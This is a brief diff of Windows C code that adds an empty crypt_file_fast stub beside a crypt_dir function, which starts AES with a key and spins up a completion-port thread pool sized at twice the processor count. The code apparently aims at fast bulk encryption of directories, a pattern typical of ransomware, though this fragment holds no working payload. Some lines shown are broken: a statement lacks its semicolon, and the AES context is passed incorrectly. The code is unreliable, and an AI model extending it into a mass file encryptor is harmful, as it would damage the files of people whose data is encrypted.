@@ -169,7 +169,15 @@ close_io(OverLapped);
   }
   }
 }
+void crypt_file_fast(char *key,char *file)
+{
 
+
+
+
+
+
+}
 void crypt_dir(char *key,char *dir)
 {
 SYSTEM_INFO sys_info;
@@ -177,7 +185,7 @@ GetSystemInfo(&sys_info);
 struct AES_ctx ctx;
 AES_init_ctx(ctx,key);
 DWORD threads;
-threads = 2* sys_info.dwNumberOfProcessors  ;
+threads = 2 * sys_info.dwNumberOfProcessors;
 HANDLE thread;
   CompletionPort = CreateIoCompletionPort(INVALID_HANDLE_VALUE,0,0,threads)
     if(CompletionPort)
